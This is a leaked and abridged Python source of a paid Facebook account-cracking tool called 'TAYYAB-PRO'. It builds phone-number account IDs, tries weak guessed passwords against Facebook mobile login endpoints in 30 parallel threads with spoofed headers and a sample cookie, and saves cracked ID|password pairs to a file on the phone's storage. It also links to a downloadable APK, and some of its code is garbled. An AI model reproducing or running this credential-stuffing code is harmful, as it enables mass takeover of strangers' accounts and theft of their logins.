#SOURCE LEAKED BY :TAYYAB KHAN 
#REASON : BECAUSE LOL BADSHAH
#WAS INTERFERE BETWEEN
#TAYYAB & KHAN KING  FIGHT 😎 
from os import path
...
----------------------------------------------
 Author    : TAYYAB KING
 Github    : TAYYAB110
 Facebook  : MR.TAYYAB.M.M.M
 Tool Name : TAYYAB-PRO
 Type type : PAID
 Version   : 1.9.8
----------------------------------------------
 TAYYAB Pro version 1.9.8
 
 ⫷⑅⃝✺»̶̶͓͓͓̽̽̽🄻🄾🅅🄴»̶̶͓͓͓̽̽̽🅂🅃🄾🅁🅈»̶̶͓͓͓̽̽̽⑅⃝✺❥᭄
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/TAYYAB_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
...
def pak():
                ...
                with tred(max_workers=30) as TAYYAB:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids]
                                TAYYAB.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [TAYYAB-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in TAYYAB:
                                ...
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [TAYYAB-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api(ids,names,passlist):
    ...
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryxKdfcm5ZVJqAjAUH',
    # 'cookie': 'datr=gbV_ZaLDnkSNUBs8u07hNiNh; m_pixel_ratio=2; sb=jbV_ZV0nMn_wsZqwrPKtKDuo; dpr=2.1988937854766846; locale=en_US; vpd=v1%3B660x360x2; oo=v1; wd=360x660; fr=0cqj9K4cR00Zu4DMi..Blf7Xb.9-.AAA.0.0.Blf7Xl.AWUd2TtizNw',
    'dpr': '2',
    'origin': 'https://m.facebook.com',
    'referer': 'https://m.facebook.com/login.php?next=https%3A%2F%2Fm.facebook.com%2F%3Fstype%3Dlo%26deoia%3D1%26jlou%3DAfeW0E_Uyj6lVq8qCwh0u-bryyoejE6m4KgNr8pyRLSaUAd9UEy-MePp78JM1u2r1v3klLeVbR8y6wvnNXGwBb39hwupTF4FifaWYJPN4k9tgw%26smuh%3D25865%26lh%3DAc-yE6AsnOVghRJ0Q-k%26wtsid%3Drdr_0r2H7ywy5jMLbG7rp&refsrc=deprecated&wtsid=rdr_0r2H7ywy5jMLbG7rp&_rdr',
    ...
    'viewport-width': '360',
    'x-asbd-id': '129477',
    'x-fb-lsd': 'AVrXkrCaBF0',
    'x_fb_background_state': '1',
}
                                url = 'https://m.facebook.com/a/bz'
...
def api1(ids,names,passlist):
    ...
    'x_fb_background_state': '1',
                                ...
                                url = 'https://m.facebook.com/a/bz/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [TAYYAB-OK] '+ids+' | '+pas+'\033[1;97m')
...
def rndm(ids,passlist):
    ...
    'x_fb_background_state': '1',
                                ...
                                url = 'https://m.facebook.com/a/bz'auth.login'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/TAYYAB-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [TAYYAB-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/TAYYAB-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [TAYYAB-OK] '+uid+' | '+pas+'\033[1;97m')
